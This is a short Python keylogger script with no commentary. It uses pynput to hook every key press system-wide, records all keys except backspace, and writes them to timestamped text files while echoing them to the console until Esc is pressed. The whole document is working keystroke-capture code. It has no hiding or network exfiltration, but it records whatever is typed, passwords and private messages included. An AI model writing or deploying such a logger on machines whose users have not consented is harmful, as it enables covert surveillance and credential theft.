import pynput
from pynput.keyboard import Key, Listener
import datetime

keys = []

def on_press(key):
    if key != Key.backspace:  # Exclude backspace key
        keys.append(key)
        write_file(keys)

        try:
            print('alphanumeric key {0} pressed'.format(key.char))
        except AttributeError:
            print('special key {0} pressed'.format(key))

def write_file(keys):
    filename = 'log_' + datetime.datetime.now().strftime("%Y%m%d%H%M%S") + '.txt'
    with open(filename, 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
            # every keystroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
